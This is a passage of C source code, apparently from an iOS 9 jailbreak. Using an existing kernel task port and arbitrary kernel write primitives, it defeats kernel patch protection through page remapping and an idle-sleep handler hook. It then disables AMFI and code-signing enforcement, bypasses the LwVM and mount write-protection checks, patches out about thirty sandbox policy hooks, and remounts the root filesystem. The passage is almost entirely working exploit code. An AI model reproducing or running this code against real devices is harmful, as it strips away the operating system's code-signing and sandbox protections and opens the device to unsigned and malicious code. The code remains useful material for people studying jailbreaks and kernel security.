    mach_vm_protect(tfp0, kppsh, 0x1000, 0, VM_PROT_READ|VM_PROT_EXECUTE);
    
    sleep(1);
    
    {
        printLog("[*] Remapping CPACR_EL1");
        uint64_t new_cpacr_addr = fakepage_lookup(cpacr_addr, physp);
        WriteAnywhere32(new_cpacr_addr, 0x94000000 | (((shtramp - cpacr_addr)/4) & 0x3FFFFFF));// call kppsh
        
        // Remapping shtramp
        uint64_t new_shtramp = fakepage_lookup(shtramp, physp);
        WriteAnywhere32(new_shtramp,   0x58000041); // ldr      x1, =kppsh
        WriteAnywhere32(new_shtramp+4, 0xd61f0020); // br       x1
        WriteAnywhere64(new_shtramp+8, kppsh);      // .quad    _kppsh
    }
    
    printLog("Jailbreaking");
    
#ifdef PATCH_TFP0
    {
        uint64_t new_tfp0_addr = fakepage_lookup(tfp0_addr, physp);
        WriteAnywhere32(new_tfp0_addr, 0xd503201f);
        printLog("[patched] tfp0");
    }
#endif
    
    {
        uint64_t new_debug_enabled = fakepage_lookup(debug_enabled, physp);
        WriteAnywhere32(new_debug_enabled, 1);
        printLog("[patched] debug_enabled");
    }
    
    {
        // LwVM
        printLog("[LwVM] _PE_i_can_has_kernel_configuration: isWriteProtected check bypass");
        DEBUGLog("LwVM: %llx, %llx", lwvm_krnl_conf_got, lwvm_jump);
        WriteAnywhere64(lwvm_krnl_conf_got, lwvm_jump);
    }
    
    {
        // mac_mount
        uint64_t new_mac_mount = fakepage_lookup(mac_mount, physp);
        WriteAnywhere32(new_mac_mount, 0x14000020); // tbnz w20, 0x0, _addr -> b _addr
        printLog("[patched] _mac_mount");
    }
    
    {
        uint64_t amfi_get_out_of_my_way     = amfi_allow_any_sign+1;
        uint64_t cs_enforcement_disable     = amfi_allow_any_sign+2;
        
        DEBUGLog("amfi_get_out_of_my_way: %llx", amfi_get_out_of_my_way);
        DEBUGLog("cs_enforcement_disable: %llx", cs_enforcement_disable);
        
        uint64_t new_amfi_get_out_of_my_way = fakepage_lookup(amfi_get_out_of_my_way, physp);
        uint64_t new_cs_enforcement_disable = fakepage_lookup(cs_enforcement_disable, physp);
        
        WriteAnywhere8(new_amfi_get_out_of_my_way, 1); // _allowEverything
        WriteAnywhere8(new_cs_enforcement_disable, 1); // _csEnforcementDisable
        
        printLog("[patched] cs_enforcement_disable");
        printLog("[patched] amfi_get_out_of_my_way");
        
        uint64_t newa = fakepage_lookup(amfi_ret, physp);
        WriteAnywhere32(newa,   0x58000041); // ldr      x1, =amfi
        WriteAnywhere32(newa+4, 0xd61f0020); // br       x1
        WriteAnywhere64(newa+8, shc+0x400);  // .quad    _amfi
        printLog("[patched] amfi shellcode");
        
    }
    
    
    {
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_file_check_mmap), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_rename), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_access), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat), physp);
        
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_proc_check_fork), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_iokit_check_open), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_fsctl), physp);
        policy_patch(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_revoke), physp);
        
        printLog("[Sandbox] sandbox mac_policy_ops");
    }
    
    sleep(1);
    
    // set faketable
    level1_table = physp - gPhysBase + gVirtBase;
    WriteAnywhere64(ReadAnywhere64(pmap_location), level1_table);
    
    // switch to fake TTBR1_EL1
    if(ReadAnywhere64(reg+8) == idlesleep_handler - gVirtBase + gPhysBase + 0xc){
        DEBUGLog("Found start_cpu_paddr: %llx", reg+8);
        WriteAnywhere64(reg+8,  physcode + 0x200); // _start_cpu_paddr
    }
    if(ReadAnywhere64(reg+0x18) == idlesleep_handler - gVirtBase + gPhysBase){
        DEBUGLog("Found resume_idle_cpu_paddr: %llx", reg+0x18);
        WriteAnywhere64(reg+0x18,  physcode + 0x100); // _resume_idle_cpu_paddr
    }
    
    /*-- hook idlesleep handler --*/
    for (int i = 0; i < z; i++) {
        WriteAnywhere64(plist[i], physcode + 0x100); // _resume_idle_cpu_paddr
    }
    
    printLog("enabled patches");
    
    sleep(1);
    
    return 0;
}

int unjail9(mach_port_t pt, uint64_t region, int lwvm_type, int kpp)
{
    int ret=0;
    
    tfp0 = pt;
    
    if(kpp == 1){
        ret = kpp9(region, lwvm_type);
        
        char *nmz = strdup("/dev/disk0s1s1");
        int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz); // remount?
        printLog("remounting: %d", rv);
        
    } else {
        ret = kpatch9(region, lwvm_type);
        // already remounted
    }
    
    return ret;
}
